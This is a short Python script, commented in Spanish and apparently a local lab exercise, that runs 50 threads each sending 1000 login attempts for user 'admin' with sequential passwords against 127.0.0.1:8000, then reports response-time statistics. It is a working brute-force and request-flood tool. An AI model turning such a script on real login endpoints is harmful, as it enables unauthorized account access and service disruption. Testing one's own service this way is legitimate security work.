import requests
import threading
import time

URL = "http://127.0.0.1:8000/"
# URL = "https://127.0.0.1:8000/"

# Lista para los tiempos de respuesta
tiempos = []

lock = threading.Lock()

def ataque():
    session = requests.Session()
    for i in range(1000):
        try:
            inicio = time.perf_counter()
            session.post(
                URL,
                data={
                    "username": "admin",
                    "password": f"pass{i}"
                },
                timeout=1
            )
            fin = time.perf_counter()
            with lock:
                tiempos.append(fin - inicio)
        except requests.exceptions.RequestException:
            pass

print("Iniciando ataque...")

inicio_total = time.perf_counter()
hilos = []
for _ in range(50):      # 50 hilos
    t = threading.Thread(target=ataque)
    t.start()
    hilos.append(t)
for t in hilos:
    t.join()
fin_total = time.perf_counter()

print("\nAtaque finalizado.")

if tiempos:
    media = sum(tiempos) / len(tiempos)
    print(f"Peticiones realizadas: {len(tiempos)}")
    print(f"Tiempo medio: {media*1000:.2f} ms")
    print(f"Tiempo mínimo: {min(tiempos)*1000:.2f} ms")
    print(f"Tiempo máximo: {max(tiempos)*1000:.2f} ms")
print(f"Tiempo total del ataque: {fin_total - inicio_total:.2f} s")